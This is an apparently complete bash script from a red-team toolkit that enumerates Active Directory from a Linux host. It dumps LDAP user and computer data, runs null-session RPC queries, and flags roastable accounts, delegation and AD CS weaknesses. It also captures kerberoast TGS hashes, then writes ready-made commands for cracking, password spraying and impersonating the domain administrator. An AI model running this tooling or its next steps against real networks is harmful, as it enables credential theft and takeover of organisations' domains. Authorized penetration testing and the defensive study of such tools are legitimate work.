#!/usr/bin/env bash
# EnumGod - Red Team Enumeration Toolkit   |   Author: Jeet Ramoliya
# ============================================================================
# rt-adenum.sh  -  Red Team ACTIVE DIRECTORY enumeration FROM A LINUX host.
#                  Companion to Invoke-RTEnum.ps1; same ranked findings model.
#
# WHAT IT DOES
#   From a Linux foothold (domain-joined OR just reachable to a DC with creds),
#   enumerate the domain over LDAP/SMB/Kerberos and rank what's exploitable:
#   kerberoastable / AS-REP users, delegation, MAQ, ACL/RBCD hints, AD CS,
#   password policy, trusts, shares. Writes NEXT_STEPS with impacket/certipy/
#   netexec commands pre-filled.
#
# ENGINE (auto-detected, best first; everything degrades gracefully)
#   - netexec / crackmapexec  (ldap, smb, --users, --kerberoasting, maq ...)
#   - impacket  (GetUserSPNs.py, GetNPUsers.py, findDelegation.py, lookupsid.py)
#   - ldapsearch (raw LDAP, simple or GSSAPI bind)
#   - certipy  (AD CS ESC analysis)
#   - rpcclient / smbclient / nmblookup (SMB/RPC fallback)
#   With NONE installed it still prints the exact commands to run elsewhere.
#
# USAGE
#   ./rt-adenum.sh -d corp.local --dc 10.0.0.10 -u user -p 'Passw0rd!'
#   ./rt-adenum.sh -d corp.local --dc dc01.corp.local -u user -H <NTLM-hash>
#   ./rt-adenum.sh -d corp.local --dc 10.0.0.10 -k           # use host Kerberos ccache (kinit first)
#   ./rt-adenum.sh -d corp.local --dc 10.0.0.10              # anonymous/guest attempt
#   ./rt-adenum.sh ... -o /dev/shm -j
# ============================================================================
set -u

DOMAIN=""; DC=""; USER=""; PASS=""; HASH=""; KERB=0; OUTBASE="."; JSON=0
while [ $# -gt 0 ]; do
  case "$1" in
    -d|--domain) DOMAIN="$2"; shift 2;;
    --dc) DC="$2"; shift 2;;
    -u|--user) USER="$2"; shift 2;;
    -p|--pass) PASS="$2"; shift 2;;
    -H|--hash) HASH="$2"; shift 2;;
    -k|--kerberos) KERB=1; shift;;
    -o) OUTBASE="$2"; shift 2;;
    -j|--json) JSON=1; shift;;
    -h|--help) grep '^#' "$0" | sed 's/^# \{0,1\}//'; exit 0;;
    *) echo "unknown arg: $1"; exit 1;;
  esac
done

# auto-discover domain/DC from host config if not supplied
[ -z "$DOMAIN" ] && DOMAIN=$(grep -i '^default_realm' /etc/krb5.conf 2>/dev/null | awk -F= '{print tolower($2)}' | tr -d ' ')
[ -z "$DOMAIN" ] && DOMAIN=$(domainname 2>/dev/null | grep -v '(none)')
[ -z "$DC" ] && DC=$(grep -iA3 "\[realms\]" /etc/krb5.conf 2>/dev/null | grep -i kdc | head -1 | awk -F= '{print $2}' | tr -d ' ')
if [ -z "$DOMAIN" ]; then echo "[-] No domain. Pass -d <fqdn> (and --dc <ip/host>)."; exit 1; fi
[ -z "$DC" ] && DC="$DOMAIN"

HOST=$(hostname 2>/dev/null || echo linux)
TS=$(date +%Y%m%d_%H%M%S)
RUN="${OUTBASE%/}/adenum_${DOMAIN//./_}_${TS}"
mkdir -p "$RUN" 2>/dev/null || { echo "[-] cannot create $RUN"; exit 1; }

if [ -t 1 ]; then R=$'\e[31m'; Y=$'\e[33m'; C=$'\e[36m'; G=$'\e[32m'; D=$'\e[90m'; N=$'\e[0m'; else R=; Y=; C=; G=; D=; N=; fi
SUMMARY="$RUN/00_SUMMARY.txt"; NEXT="$RUN/NEXT_STEPS.txt"; JFILE="$RUN/findings.json"
: > "$SUMMARY"; : > "$NEXT"
HIGHN=0; MEDN=0; INFON=0
declare -a J_HIGH=() J_MED=() J_INFO=() J_NEXT=()

sect(){ printf '\n%s[==== %s ====]%s\n' "$C" "$1" "$N"; }
flag(){ sev="$1"; shift; txt="$*"
  case "$sev" in
    HIGH) col=$R;tag="[HIGH]";HIGHN=$((HIGHN+1));J_HIGH+=("$txt");;
    MED)  col=$Y;tag="[MED ]";MEDN=$((MEDN+1));J_MED+=("$txt");;
    *)    col=$D;tag="[INFO]";INFON=$((INFON+1));J_INFO+=("$txt");;
  esac
  printf '%s%s %s%s\n' "$col" "$tag" "$txt" "$N"; printf '%s %s\n' "$tag" "$txt" >> "$SUMMARY"; }
nextstep(){ printf '[*] %s\n    %s\n\n' "$1" "$2" >> "$NEXT"; J_NEXT+=("$1 :: $2"); }
save(){ cat > "$RUN/$1"; }
has(){ command -v "$1" >/dev/null 2>&1; }

# build credential fragments for each engine
NXC=""; has netexec && NXC="netexec"; has nxc && NXC="nxc"; has crackmapexec && [ -z "$NXC" ] && NXC="crackmapexec"
# auth args per engine
nxc_auth(){ a="-u '$USER'"; if [ -n "$HASH" ]; then a="$a -H '$HASH'"; elif [ -n "$PASS" ]; then a="$a -p '$PASS'"; fi; [ "$KERB" = 1 ] && a="$a -k"; echo "$a"; }
LDAPBASE="dc=$(echo "$DOMAIN" | sed 's/\./,dc=/g')"

enumgod_banner(){
  printf '%s' "${C:-}"
  cat <<'ART'
 _____                        ____           _
| ____|_ __  _   _ _ __ ___  / ___| ___   __| |
|  _| | '_ \| | | | '_ ` _ \| |  _ / _ \ / _` |
| |___| | | | |_| | | | | | | |_| | (_) | (_| |
|_____|_| |_|\__,_|_| |_| |_|\____|\___/ \__,_|
ART
  printf '%s   EnumGod  Red Team Enumeration Toolkit%s\n' "${G:-}" "${N:-}"
  printf '%s   author : Jeet Ramoliya   module : %s%s\n\n' "${D:-}" "$1" "${N:-}"
}
enumgod_banner "AD from Linux"
echo "${G}[*] rt-adenum  ->  $RUN${N}"
echo "${D}[*] domain=$DOMAIN dc=$DC user=${USER:-<anon>} engine=${NXC:-none/ldapsearch}${N}"

# connectivity + engine note
sect "Engine & connectivity"
{
  echo "domain=$DOMAIN dc=$DC base=$LDAPBASE"
  echo "netexec/cme : ${NXC:-ABSENT}"
  for t in ldapsearch impacket-GetUserSPNs GetUserSPNs.py certipy certipy-ad rpcclient smbclient kinit bloodhound-python; do
    has "$t" && echo "tool present : $t"
  done
} | save 00_engine.txt
if [ -z "$NXC" ] && ! has ldapsearch && ! has GetUserSPNs.py && ! has impacket-GetUserSPNs; then
  flag INFO "No AD tooling found locally - findings will be the exact commands to run from a tooled box."
fi

# ---------- LDAP raw dump (works without special tools if ldapsearch present) ----------
LDAP_OK=0
if has ldapsearch; then
  sect "LDAP enumeration (ldapsearch)"
  BINDARGS=""
  if [ "$KERB" = 1 ]; then BINDARGS="-Y GSSAPI";
  elif [ -n "$USER" ] && [ -n "$PASS" ]; then BINDARGS="-x -D ${USER}@${DOMAIN} -w ${PASS}";
  else BINDARGS="-x"; fi
  LURI="ldap://${DC}"
  # quick bind test
  if ldapsearch -LLL -H "$LURI" $BINDARGS -b "$LDAPBASE" -s base dn >/dev/null 2>&1; then
    LDAP_OK=1
    # all users with key attrs
    ldapsearch -LLL -H "$LURI" $BINDARGS -b "$LDAPBASE" \
      "(&(objectCategory=person)(objectClass=user))" \
      sAMAccountName userAccountControl servicePrincipalName description adminCount msDS-AllowedToDelegateTo 2>/dev/null | save 01_users_ldap.txt
    ldapsearch -LLL -H "$LURI" $BINDARGS -b "$LDAPBASE" \
      "(objectCategory=computer)" \
      dNSHostName operatingSystem userAccountControl msDS-AllowedToActOnBehalfOfOtherIdentity 2>/dev/null | save 02_computers_ldap.txt
    ldapsearch -LLL -H "$LURI" $BINDARGS -b "$LDAPBASE" "(objectClass=trustedDomain)" trustPartner trustDirection trustAttributes 2>/dev/null | save 03_trusts_ldap.txt

    U="$RUN/01_users_ldap.txt"; C2="$RUN/02_computers_ldap.txt"
    # kerberoastable = has SPN and is a user
    awk '/^sAMAccountName:/{n=$2} /^servicePrincipalName:/{print n}' "$U" 2>/dev/null | sort -u | while read -r s; do
      [ -n "$s" ] && echo "KRB:$s"
    done | sort -u > "$RUN/.krb" 2>/dev/null
    if [ -s "$RUN/.krb" ]; then
      flag HIGH "Kerberoastable users found ($(wc -l < "$RUN/.krb")) - see 01_users_ldap.txt."
      nextstep "Kerberoast" "${NXC:-nxc} ldap $DC $(nxc_auth) --kerberoasting kerb.txt   # or GetUserSPNs.py $DOMAIN/$USER:PASS -dc-ip $DC -request"
    fi
    # AS-REP (UAC 0x400000 = 4194304 -> DONT_REQ_PREAUTH). Portable bit test (no gawk and()).
    awk '/^sAMAccountName:/{n=$2} /^userAccountControl:/{u=$2+0; if(int(u/4194304)%2==1) print n}' "$U" 2>/dev/null > "$RUN/.asrep" 2>/dev/null
    if [ -s "$RUN/.asrep" ]; then
      flag HIGH "AS-REP roastable users (DONT_REQUIRE_PREAUTH): $(tr '\n' ' ' < "$RUN/.asrep")"
      nextstep "AS-REP roast" "GetNPUsers.py $DOMAIN/ -dc-ip $DC -usersfile users.txt -no-pass -format hashcat"
    fi
    # unconstrained delegation (UAC 0x80000 = 524288) on users or computers
    awk '/^sAMAccountName:|^dNSHostName:/{n=$2} /^userAccountControl:/{u=$2+0; if(int(u/524288)%2==1) print n}' "$U" "$C2" 2>/dev/null | sort -u > "$RUN/.unc"
    [ -s "$RUN/.unc" ] && flag HIGH "Unconstrained delegation principals: $(tr '\n' ' ' < "$RUN/.unc") - coerce + capture TGT."
    # constrained delegation
    grep -q '^msDS-AllowedToDelegateTo:' "$U" "$C2" 2>/dev/null && { flag HIGH "Constrained delegation configured (msDS-AllowedToDelegateTo) - see LDAP dumps."; nextstep "Constrained deleg" "getST.py -spn <target-spn> -impersonate administrator $DOMAIN/<acct>:PASS -dc-ip $DC"; }
    # RBCD present
    grep -q '^msDS-AllowedToActOnBehalfOfOtherIdentity' "$C2" 2>/dev/null && flag HIGH "RBCD attribute set on a computer object - see 02_computers_ldap.txt."
    # pwd-not-required (UAC 0x20 = 32)
    awk '/^sAMAccountName:/{n=$2} /^userAccountControl:/{u=$2+0; if(int(u/32)%2==1) print n}' "$U" 2>/dev/null | head -20 | while read -r s; do [ -n "$s" ] && flag MED "PASSWD_NOTREQD: $s (possible blank password)."; done
    # secret-shaped descriptions
    grep -i '^description:' "$U" 2>/dev/null | grep -Eiq 'pass|pwd|secret|cred' && flag MED "Secret-shaped user description present (grep description: in 01_users_ldap.txt)."
    # machine account quota
    MAQ=$(ldapsearch -LLL -H "$LURI" $BINDARGS -b "$LDAPBASE" -s base ms-DS-MachineAccountQuota 2>/dev/null | awk -F': ' '/MachineAccountQuota/{print $2}')
    [ -n "$MAQ" ] && { flag INFO "ms-DS-MachineAccountQuota=$MAQ"; [ "$MAQ" -gt 0 ] 2>/dev/null && flag MED "MAQ=$MAQ -> any user can add machine accounts (RBCD / noPac)."; }
  else
    flag INFO "ldapsearch bind failed (bad creds / needs GSSAPI / channel binding). Try -k after kinit, or netexec."
  fi
fi

# ---------- netexec / cme (richer, if present) ----------
if [ -n "$NXC" ] && [ -n "$USER" ]; then
  sect "netexec/CME enumeration"
  AUTH=$(nxc_auth)
  {
    echo "== ldap --users =="; eval "$NXC ldap $DC $AUTH --users" 2>&1 | tail -60
    echo; echo "== ldap --groups (Domain Admins) =="; eval "$NXC ldap $DC $AUTH --groups 'Domain Admins'" 2>&1 | tail -30
    echo; echo "== smb shares (DC) =="; eval "$NXC smb $DC $AUTH --shares" 2>&1 | tail -40
    echo; echo "== pass-pol =="; eval "$NXC smb $DC $AUTH --pass-pol" 2>&1 | tail -20
  } | save 04_netexec.txt
  # lockout threshold -> spray safety
  LT=$(grep -i 'lockout threshold' "$RUN/04_netexec.txt" 2>/dev/null | grep -oE '[0-9]+|None' | head -1)
  if [ "$LT" = "None" ] || [ "$LT" = "0" ]; then flag MED "Lockout threshold = ${LT:-?} -> password spraying is safe."; nextstep "Spray" "$NXC smb $DC -u users.txt -p 'Season2026!' --continue-on-success"; fi
  # writable shares
  grep -iE 'READ,WRITE|WRITE' "$RUN/04_netexec.txt" 2>/dev/null | grep -viq 'SYSVOL\|NETLOGON' && flag MED "Writable SMB share on DC (see 04_netexec.txt)."
fi

# ---------- impacket one-shots (if present and creds given) ----------
if [ -n "$USER" ] && { has GetUserSPNs.py || has impacket-GetUserSPNs; }; then
  sect "impacket kerberoast / AS-REP (generates 4769 events)"
  SPN=$(command -v GetUserSPNs.py || command -v impacket-GetUserSPNs)
  CREDS="$DOMAIN/$USER"; [ -n "$PASS" ] && CREDS="$CREDS:$PASS"
  if [ -n "$HASH" ]; then "$SPN" "$CREDS" -hashes ":$HASH" -dc-ip "$DC" -request 2>/dev/null | save 05_kerberoast.txt
  elif [ -n "$PASS" ]; then "$SPN" "$CREDS" -dc-ip "$DC" -request 2>/dev/null | save 05_kerberoast.txt; fi
  grep -q '\$krb5tgs\$' "$RUN/05_kerberoast.txt" 2>/dev/null && { flag HIGH "Captured kerberoast TGS hash(es) in 05_kerberoast.txt -> crack with hashcat -m 13100."; nextstep "Crack TGS" "hashcat -m 13100 05_kerberoast.txt wordlist.txt"; }
fi

# ---------- AD CS (certipy) ----------
if has certipy || has certipy-ad; then
  sect "AD CS ESC analysis (certipy)"
  CP=$(command -v certipy-ad || command -v certipy)
  if [ -n "$USER" ] && [ -n "$PASS" ]; then
    "$CP" find -u "${USER}@${DOMAIN}" -p "$PASS" -dc-ip "$DC" -vulnerable -stdout 2>/dev/null | save 06_adcs.txt
    grep -qiE 'ESC[0-9]+' "$RUN/06_adcs.txt" 2>/dev/null && { flag HIGH "AD CS ESC vulnerability reported by certipy (see 06_adcs.txt)."; nextstep "AD CS ESC" "certipy req -u ${USER}@${DOMAIN} -p PASS -ca <CA> -template <tpl> -upn administrator@${DOMAIN}"; }
  else
    flag INFO "certipy present - supply -u/-p to run 'certipy find -vulnerable'."
  fi
fi

# ---------- RPC / SMB fallback (no creds / null session) ----------
if has rpcclient && [ -z "$LDAP_OK" -o "$LDAP_OK" = "0" ]; then
  sect "RPC/SMB fallback (null/guest)"
  {
    echo "== enumdomusers (null) =="; rpcclient -U "" -N "$DC" -c enumdomusers 2>/dev/null | head -60
    echo; echo "== querydominfo =="; rpcclient -U "" -N "$DC" -c querydominfo 2>/dev/null
  } | save 07_rpc.txt
  grep -q 'user:' "$RUN/07_rpc.txt" 2>/dev/null && flag MED "Null-session user enumeration works on $DC (see 07_rpc.txt)."
fi

# ---------- BloodHound collection hint ----------
if has bloodhound-python; then
  flag INFO "bloodhound-python present - collect the graph for path-finding."
  [ -n "$USER" ] && nextstep "BloodHound collect" "bloodhound-python -d $DOMAIN -u $USER -p PASS -ns $DC -c all --zip"
fi

# ---------- summary ----------
sect "Writing ranked summary"
{
  echo "rt-adenum summary - $DOMAIN - $(date)"
  echo "DC=$DC  as=${USER:-<anon>}  engine=${NXC:-ldapsearch/none}"
  echo
  echo "### HIGH ($HIGHN) ###"; printf '%s\n' "${J_HIGH[@]:-}"
  echo; echo "### MED ($MEDN) ###"; printf '%s\n' "${J_MED[@]:-}"
  echo; echo "### INFO ($INFON) ###"; printf '%s\n' "${J_INFO[@]:-}"
  echo; echo "=== RECOMMENDED NEXT MOVE ==="
  if [ -s "$NEXT" ]; then head -2 "$NEXT" | sed 's/^\[\*\] /-> /'; else echo "-> Get valid creds first (spray / roast / null-session), then re-run with -u/-p."; fi
} > "$SUMMARY"

if [ "$JSON" = "1" ]; then
  jarr(){ printf '['; first=1; shift; for e in "$@"; do [ $first -eq 1 ]||printf ','; first=0; printf '%s' "$e" | sed 's/\\/\\\\/g;s/"/\\"/g' | awk '{printf "\"%s\"",$0}'; done; printf ']'; }
  {
    printf '{\n  "domain":"%s","dc":"%s","identity":"%s","ts":"%s",\n' "$DOMAIN" "$DC" "${USER:-anon}" "$TS"
    printf '  "high":'; jarr x "${J_HIGH[@]:-}"; printf ',\n'
    printf '  "med":';  jarr x "${J_MED[@]:-}";  printf ',\n'
    printf '  "info":'; jarr x "${J_INFO[@]:-}"; printf ',\n'
    printf '  "next_steps":'; jarr x "${J_NEXT[@]:-}"; printf '\n}\n'
  } > "$JFILE"
fi

rm -f "$RUN/.krb" "$RUN/.asrep" "$RUN/.unc" 2>/dev/null
echo
echo "${G}[+] Done. HIGH=$HIGHN MED=$MEDN INFO=$INFON${N}"
echo "${G}[+] Read: $SUMMARY  and  $NEXT${N}"
